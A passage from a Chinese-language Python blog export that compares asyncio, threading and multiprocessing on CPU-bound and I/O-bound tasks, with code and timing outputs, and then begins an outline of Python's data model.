<h4 id="asyncio-low-level"><a href="#asyncio-low-level" class="headerlink" title="asyncio-low-level"></a>asyncio-low-level</h4><div class="tabs" id="asyncio&yield"><ul class="nav-tabs"><li class="tab active"><a href="#asyncio&yield-1">run_until_complete</a></li><li class="tab"><a href="#asyncio&yield-2">call_soon&call_later</a></li><li class="tab"><a href="#asyncio&yield-3">socketpair</a></li><li class="tab"><a href="#asyncio&yield-4">signal_handler</a></li></ul><div class="tab-content"><div class="tab-pane active" id="asyncio&yield-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">display_date</span>(<span class="params">loop</span>):</span><br><span class="line">    end_time = loop.time() + <span class="number">3.0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(datetime.datetime.now())</span><br><span class="line">        <span class="keyword">if</span> (loop.time() + <span class="number">1.0</span>) &gt;= end_time:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(display_date(loop)) <span class="comment"># Blocking call which returns when the display_date() coroutine is done</span></span><br><span class="line">loop.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;[Output]</span></span><br><span class="line"><span class="string">2022-01-16 00:37:06.529115</span></span><br><span class="line"><span class="string">2022-01-16 00:37:07.530571</span></span><br><span class="line"><span class="string">2022-01-16 00:37:08.531944</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="asyncio&yield-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">display_date</span>(<span class="params">end_time, loop</span>):</span><br><span class="line">    <span class="built_in">print</span>(datetime.datetime.now())</span><br><span class="line">    <span class="keyword">if</span> (loop.time() + <span class="number">1.0</span>) &lt; end_time:</span><br><span class="line">        loop.call_later(<span class="number">1</span>, display_date, end_time, loop)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        loop.stop()</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">end_time = loop.time() + <span class="number">3.0</span></span><br><span class="line">loop.call_soon(display_date, end_time, loop)  <span class="comment"># 设置callback: Schedule the first call to display_date()</span></span><br><span class="line">loop.run_forever()                            <span class="comment"># 运行callback: Blocking call interrupted by loop.stop()</span></span><br><span class="line">loop.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;[Output]</span></span><br><span class="line"><span class="string">2022-01-16 00:38:14.206514</span></span><br><span class="line"><span class="string">2022-01-16 00:38:15.208637</span></span><br><span class="line"><span class="string">2022-01-16 00:38:16.209938</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="asyncio&yield-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> socket <span class="keyword">import</span> socketpair</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">from</span> asyncio.windows_utils <span class="keyword">import</span> socketpair</span><br><span class="line"></span><br><span class="line">rsock, wsock = socketpair()                <span class="comment"># Create a pair of connected file descriptors</span></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reader</span>():</span><br><span class="line">    data = rsock.recv(<span class="number">100</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Received:&quot;</span>, data.decode())</span><br><span class="line">    <span class="comment"># We are done: unregister the file descriptor</span></span><br><span class="line">    loop.remove_reader(rsock)</span><br><span class="line">    <span class="comment"># Stop the event loop</span></span><br><span class="line">    loop.stop()</span><br><span class="line"></span><br><span class="line">loop.add_reader(rsock, reader)             <span class="comment"># Register the file descriptor for read event</span></span><br><span class="line">loop.call_soon(wsock.send, <span class="string">&#x27;abc&#x27;</span>.encode()) <span class="comment"># Simulate the reception of data from the network</span></span><br><span class="line">loop.run_forever()                         <span class="comment"># Run the event loop</span></span><br><span class="line">rsock.close()</span><br><span class="line">wsock.close()</span><br><span class="line">loop.close()</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="asyncio&yield-4"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ask_exit</span>(<span class="params">signame</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;got signal %s: exit&quot;</span> % signame)</span><br><span class="line">    loop.stop()</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line"><span class="keyword">for</span> signame <span class="keyword">in</span> (<span class="string">&#x27;SIGINT&#x27;</span>, <span class="string">&#x27;SIGTERM&#x27;</span>):</span><br><span class="line">    loop.add_signal_handler(<span class="built_in">getattr</span>(signal, signame),</span><br><span class="line">                            functools.partial(ask_exit, signame))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Event loop running forever, press Ctrl+C to interrupt.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pid %s: send SIGINT or SIGTERM to exit.&quot;</span> % os.getpid())</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    loop.run_forever()</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    loop.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;[Output]</span></span><br><span class="line"><span class="string">Event loop running forever, press Ctrl+C to interrupt.</span></span><br><span class="line"><span class="string">pid 74124: send SIGINT or SIGTERM to exit.</span></span><br><span class="line"><span class="string">^Cgot signal SIGINT: exit</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="并发场景"><a href="#并发场景" class="headerlink" title="并发场景"></a>并发场景</h1><h2 id="CPU-bound任务"><a href="#CPU-bound任务" class="headerlink" title="CPU-bound任务"></a>CPU-bound任务</h2><ul>
<li>任务特征：<ul>
<li>程序在CPU操作上耗时多</li>
<li>需要找到在单位时间内进行更多计算的方法</li>
</ul>
</li>
<li>并发结论：<ul>
<li>asyncio因为只跑在一个CPU核心上，且需要管理并调度协程，不能为任务提速</li>
<li>threading版本因为GIL的存在，且需要管理并调度线程，会比sync版本还会慢一些，不能为任务提速</li>
<li>multiprocessing版本可以利用多核并行计算，将任务合理划分为独立的步骤后，可以为任务提速</li>
</ul>
</li>
</ul>
<div class="tabs" id="cpu-bound"><ul class="nav-tabs"><li class="tab active"><a href="#cpu-bound-1">cpu_sync</a></li><li class="tab"><a href="#cpu-bound-2">cpu_multiprocessing</a></li><li class="tab"><a href="#cpu-bound-3">cpu_threading</a></li></ul><div class="tab-content"><div class="tab-pane active" id="cpu-bound-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cpu_bound</span>(<span class="params">number</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(i * i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(number))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_sums</span>(<span class="params">numbers</span>):</span><br><span class="line">    <span class="keyword">for</span> number <span class="keyword">in</span> numbers:</span><br><span class="line">        cpu_bound(number)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    numbers = [<span class="number">5_000_000</span> + x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line"></span><br><span class="line">    start_time = time.time()</span><br><span class="line">    find_sums(numbers)</span><br><span class="line">    duration = time.time() - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Duration <span class="subst">&#123;duration&#125;</span> seconds&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;[Output]</span></span><br><span class="line"><span class="string">Duration 6.520792245864868 seconds</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="cpu-bound-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cpu_bound</span>(<span class="params">number</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(i * i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(number))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_sums</span>(<span class="params">numbers</span>):</span><br><span class="line">    <span class="keyword">with</span> multiprocessing.Pool() <span class="keyword">as</span> pool:</span><br><span class="line">        pool.<span class="built_in">map</span>(cpu_bound, numbers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    numbers = [<span class="number">5_000_000</span> + x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line"></span><br><span class="line">    start_time = time.time()</span><br><span class="line">    find_sums(numbers)</span><br><span class="line">    duration = time.time() - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Duration <span class="subst">&#123;duration&#125;</span> seconds&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;[Output]</span></span><br><span class="line"><span class="string">Duration 1.9415397644042969 seconds</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="cpu-bound-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> concurrent.futures</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cpu_bound</span>(<span class="params">number</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(i * i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(number))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_sums</span>(<span class="params">numbers</span>):</span><br><span class="line">    <span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=<span class="number">5</span>) <span class="keyword">as</span> executor:</span><br><span class="line">        executor.<span class="built_in">map</span>(cpu_bound, numbers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    numbers = [<span class="number">5_000_000</span> + x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line"></span><br><span class="line">    start_time = time.time()</span><br><span class="line">    find_sums(numbers)</span><br><span class="line">    duration = time.time() - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Duration <span class="subst">&#123;duration&#125;</span> seconds&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;[Output]</span></span><br><span class="line"><span class="string">Duration 6.570162057876587 seconds</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="I-x2F-O-bound任务"><a href="#I-x2F-O-bound任务" class="headerlink" title="I&#x2F;O-bound任务"></a>I&#x2F;O-bound任务</h2><ul>
<li>任务特征：<ul>
<li>程序耗时在与slow device交互，例如network,hard drive,printer,…</li>
<li>需要重叠等待I&#x2F;O操作的时间以加快速度</li>
</ul>
</li>
<li>并发结论：<ul>
<li>基于asyncio的协程方式效果最好，但要求依赖的模块要支持async的实现，且需注意：<br>如果某个协程执行时出现了长时间阻塞，执行器里的所有协程都会受到影响</li>
<li>基于threading的线程方式要考虑Race Conditions，编码和调试复杂度较高</li>
<li>threading版本的速度快于multiprocessing版本，但都远好于不支持并发的sync版本</li>
</ul>
</li>
</ul>
<div class="tabs" id="io-bound"><ul class="nav-tabs"><li class="tab active"><a href="#io-bound-1">io_sync</a></li><li class="tab"><a href="#io-bound-2">io_multiprocessing</a></li><li class="tab"><a href="#io-bound-3">io_threading</a></li><li class="tab"><a href="#io-bound-4">io_asyncio</a></li></ul><div class="tab-content"><div class="tab-pane active" id="io-bound-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  <span class="comment"># pip install requests</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_site</span>(<span class="params">url, session</span>):</span><br><span class="line">    <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Read <span class="subst">&#123;<span class="built_in">len</span>(response.content)&#125;</span> from <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_all_sites</span>(<span class="params">sites</span>):</span><br><span class="line">    <span class="keyword">with</span> requests.Session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> sites:</span><br><span class="line">            download_site(url, session)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sites = [</span><br><span class="line">        <span class="string">&quot;https://www.jython.org&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http://olympus.realpython.org/dice&quot;</span>,</span><br><span class="line">    ] * <span class="number">80</span></span><br><span class="line">    start_time = time.time()</span><br><span class="line">    download_all_sites(sites)</span><br><span class="line">    duration = time.time() - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Downloaded <span class="subst">&#123;<span class="built_in">len</span>(sites)&#125;</span> in <span class="subst">&#123;duration&#125;</span> seconds&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;[Output]</span></span><br><span class="line"><span class="string">Read 10490 from https://www.jython.org</span></span><br><span class="line"><span class="string">Read 276 from http://olympus.realpython.org/dice</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">Downloaded 160 in 66.24616479873657 seconds</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="io-bound-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  <span class="comment"># pip install requests</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">session = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_global_session</span>():</span><br><span class="line">    <span class="keyword">global</span> session</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session:</span><br><span class="line">        session = requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_site</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">        name = multiprocessing.current_process().name</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span>:Read <span class="subst">&#123;<span class="built_in">len</span>(response.content)&#125;</span> from <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_all_sites</span>(<span class="params">sites</span>):</span><br><span class="line">    <span class="keyword">with</span> multiprocessing.Pool(initializer=set_global_session) <span class="keyword">as</span> pool:</span><br><span class="line">        pool.<span class="built_in">map</span>(download_site, sites)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sites = [</span><br><span class="line">        <span class="string">&quot;https://www.jython.org&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http://olympus.realpython.org/dice&quot;</span>,</span><br><span class="line">    ] * <span class="number">80</span></span><br><span class="line">    start_time = time.time()</span><br><span class="line">    download_all_sites(sites)</span><br><span class="line">    duration = time.time() - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Downloaded <span class="subst">&#123;<span class="built_in">len</span>(sites)&#125;</span> in <span class="subst">&#123;duration&#125;</span> seconds&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;[Output]</span></span><br><span class="line"><span class="string">ForkPoolWorker-2:Read 10490 from https://www.jython.org</span></span><br><span class="line"><span class="string">ForkPoolWorker-1:Read 10490 from https://www.jython.org</span></span><br><span class="line"><span class="string">ForkPoolWorker-3:Read 10490 from https://www.jython.org</span></span><br><span class="line"><span class="string">ForkPoolWorker-4:Read 10490 from https://www.jython.org</span></span><br><span class="line"><span class="string">ForkPoolWorker-1:Read 276 from http://olympus.realpython.org/dice</span></span><br><span class="line"><span class="string">ForkPoolWorker-2:Read 276 from http://olympus.realpython.org/dice</span></span><br><span class="line"><span class="string">ForkPoolWorker-3:Read 276 from http://olympus.realpython.org/dice</span></span><br><span class="line"><span class="string">ForkPoolWorker-4:Read 276 from http://olympus.realpython.org/dice</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">Downloaded 160 in 16.767204999923706 seconds</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="io-bound-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> concurrent.futures</span><br><span class="line"><span class="keyword">import</span> requests    <span class="comment"># pip install requests</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">thread_local = threading.local()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_session</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(thread_local, <span class="string">&quot;session&quot;</span>):</span><br><span class="line">        thread_local.session = requests.Session() <span class="comment"># not thread-safe</span></span><br><span class="line">    <span class="keyword">return</span> thread_local.session</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_site</span>(<span class="params">url</span>):</span><br><span class="line">    session = get_session()</span><br><span class="line">    <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Read <span class="subst">&#123;<span class="built_in">len</span>(response.content)&#125;</span> from <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_all_sites</span>(<span class="params">sites</span>):</span><br><span class="line">    <span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=<span class="number">5</span>) <span class="keyword">as</span> executor:</span><br><span class="line">        executor.<span class="built_in">map</span>(download_site, sites)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sites = [</span><br><span class="line">        <span class="string">&quot;https://www.jython.org&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http://olympus.realpython.org/dice&quot;</span>,</span><br><span class="line">    ] * <span class="number">80</span></span><br><span class="line">    start_time = time.time()</span><br><span class="line">    download_all_sites(sites)</span><br><span class="line">    duration = time.time() - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Downloaded <span class="subst">&#123;<span class="built_in">len</span>(sites)&#125;</span> in <span class="subst">&#123;duration&#125;</span> seconds&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;[Output]</span></span><br><span class="line"><span class="string">Read 276 from http://olympus.realpython.org/dice</span></span><br><span class="line"><span class="string">Read 276 from http://olympus.realpython.org/dice</span></span><br><span class="line"><span class="string">Read 276 from http://olympus.realpython.org/dice</span></span><br><span class="line"><span class="string">Read 276 from http://olympus.realpython.org/dice</span></span><br><span class="line"><span class="string">Read 10490 from https://www.jython.org</span></span><br><span class="line"><span class="string">Read 10490 from https://www.jython.org</span></span><br><span class="line"><span class="string">Read 10490 from https://www.jython.org</span></span><br><span class="line"><span class="string">Read 10490 from https://www.jython.org</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">Downloaded 160 in 13.339033842086792 seconds</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="io-bound-4"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> aiohttp  <span class="comment"># pip install aiohttp</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">download_site</span>(<span class="params">session, url</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Read &#123;0&#125; from &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(response.content_length, url))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">download_all_sites</span>(<span class="params">sites</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        tasks = []</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> sites:</span><br><span class="line">            task = asyncio.ensure_future(download_site(session, url))</span><br><span class="line">            tasks.append(task)</span><br><span class="line">        <span class="keyword">await</span> asyncio.gather(*tasks, return_exceptions=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sites = [</span><br><span class="line">        <span class="string">&quot;https://www.jython.org&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http://olympus.realpython.org/dice&quot;</span>,</span><br><span class="line">    ] * <span class="number">80</span></span><br><span class="line">    start_time = time.time()</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(download_all_sites(sites))</span><br><span class="line">    duration = time.time() - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Downloaded <span class="subst">&#123;<span class="built_in">len</span>(sites)&#125;</span> sites in <span class="subst">&#123;duration&#125;</span> seconds&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;[Output]</span></span><br><span class="line"><span class="string">Read 276 from http://olympus.realpython.org/dice</span></span><br><span class="line"><span class="string">Read 276 from http://olympus.realpython.org/dice</span></span><br><span class="line"><span class="string">Read 276 from http://olympus.realpython.org/dice</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">Read 10490 from https://www.jython.org</span></span><br><span class="line"><span class="string">Read 10490 from https://www.jython.org</span></span><br><span class="line"><span class="string">Read 10490 from https://www.jython.org</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">Downloaded 160 sites in 8.30170488357544 seconds</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://realpython.com/python-concurrency/">Speed Up Your Python Program With Concurrency</a><br><a href="https://github.com/realpython/materials">Real Python Materials</a></p>
]]></content>
      <categories>
        <category>ProgrammingLanguage</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>concurrency</tag>
      </tags>
  </entry>
  <entry>
    <title>Python基础</title>
    <url>/ProgrammingLanguage/Python/Basic.html</url>
    <content><![CDATA[<p>Python基础语法梳理，主要涉及语言本身的数据模型、提升表达力的结构、语言上的术语，关注语言层面的改进点以及演化过程。</p>
<span id="more"></span>

<h1 id="数据模型（data-model）"><a href="#数据模型（data-model）" class="headerlink" title="数据模型（data model）"></a>数据模型（data model）</h1><ul>
<li>object 所有数据都是基于对象的。Function是first-class对象，可以被变量引用、增加到list中、作为参数传递。<ul>
<li>identity 对象的唯一标识：用<code>is</code>操作符比较，用<code>id()</code>函数获取整型值。<ul>
<li>type 类型（不可更改）：用<code>type()</code>函数获取类型<ul>
<li>None ：False</li>
<li>NotImplemented ：True</li>
<li>Ellipsis ：通过<code>...</code>访问，判断时为True</li>
<li>numbers.Number<ul>
<li>Integral<ul>
<li>int</li>
<li>bool</li>
</ul>
</li>
<li>float</li>
<li>complex</li>
</ul>
</li>
<li>Sequences ：[0,n)索引的有序集合，<code>len()</code>返回数量，<code>in/not in</code>操作检查序列中是否包含某值<ul>
<li>immutable<ul>
<li>string ：只支持Unicode码点，<code>ord()/chr()</code>将码点在字符串和整形间转换，<code>str.encode()/bytes.decode()</code>指定编码的字符串与Byte间互转</li>
<li>tuple</li>
<li>byte ：8bit的数组</li>
</ul>
</li>
<li>mutable<ul>
<li>list</li>
<li>bytearray()</li>
</ul>
</li>
</ul>
</li>
<li>Set : 无序、有限的不可变对象集合，<code>len()</code>返回数量<ul>
<li>set()</li>
<li>frozenset()</li>
</ul>
</li>
<li>Mappings ：<code>len()</code>返回数量<ul>
<li><a href="#dictionary">dict()</a></li>
</ul>
</li>
<li>Callable ：函数可调用的<ul>
<li>User-defined:<ul>
<li><code>__name__</code> ：函数名称</li>
<li><code>__qualname__</code> ：函数限定名称</li>
<li><code>__module__</code> ：模块名称</li>
</ul>
</li>
<li>Instance.Method<ul>
<li><code>__self__</code> : 类实例对象</li>
<li><code>__func__</code> : 函数对象</li>
<li><code>__doc__</code> : 方法的文档</li>
<li><code>__name__</code> : 方法名</li>
<li><code>__module__</code> : 定义方法的模块名</li>
</ul>
</li>
<li>GeneratorFunction ：用<code>yield</code>语句的函数或方法<ul>
<li><code>iterator.__next__</code> 启动执行的方法</li>
<li>return后<code>raise StopIteration</code></li>
</ul>
</li>
<li>CoroutineFunction ：用<code>async def</code>定义的函数或方法<ul>
<li>返回一个coroutine对象</li>
<li>可包涵<code>await/async with/async for</code>语句</li>
</ul>
</li>
<li>Built-in Function:<ul>
<li>len()</li>
<li>math.sin()</li>
</ul>
</li>
<li>Built-in method: 内置函数的伪装<ul>
<li>list_object.append()</li>
</ul>
</li>
<li>Classes : 类对象是callable<ul>
<li><code>__new__()</code></li>
<li><code>__init__()</code></li>
</ul>
</li>
<li>ClassInstance: 任何类定义 <code>__call__()</code>后都是callable</li>
</ul>
</li>
<li>Module ：通过<code>import</code>语句导入<ul>
<li><code>__dict__</code> : 模块的名称空间，<code>m.x</code>等价于<code>m.__dict__[&quot;x&quot;]</code></li>
<li><code>__file__</code> : 模块被载入的文件路径</li>
</ul>
</li>
<li>Class instance:<ul>
<li><code>__class__</code> : 实例的类</li>
<li><code>__dict__</code> ：属性字典</li>
<li><code>__getattr__</code> ：定义后，代替直接读<code>__dict__</code></li>
<li><code>__setattr__</code> ：定义后，代替直接写<code>__dict__</code></li>
</ul>
</li>
<li>I&#x2F;O objects:<ul>
<li>open()</li>
<li>os.popen()</li>
<li>os.fdopen()</li>
<li>os.makefile()</li>
</ul>
</li>
<li>Internal-type<ul>
<li>bytecode</li>
<li>frame-object</li>
<li>traceback-object</li>
<li>slice-object<ul>
<li><code>__getitem__()</code></li>
<li><code>slice()</code></li>
</ul>
</li>
<li>staticmethod-object :<ul>
<li>@staticmethod修饰后，通过内建staticmethod()创建</li>
<li>可通过object或class访问，支持override</li>
</ul>
</li>
<li>classmethod-object :<ul>
<li>@classmethod修饰后，通过内建classmethod()创建</li>
<li>只能通过class访问</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>value 值：可变时为<code>mutable</code>对象，不可变时为<code>immutable</code>对象<ul>
<li>immutable<ul>
<li>instance</li>
<li>number</li>
<li>string</li>
<li>tuple<ul>
<li>不可变对象的新值引用到任何已存在的不可变对象，因此<code>a=1; b=1</code>中a和b不一定引用同一个对象。</li>
</ul>
</li>
</ul>
</li>
<li>mutable<ul>
<li>dict</li>
<li>list<ul>
<li>可变对象的新值一定是新创建的对象，因此<code>c=[]; d=[]</code>中c和d一定是两个新创建的对象。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
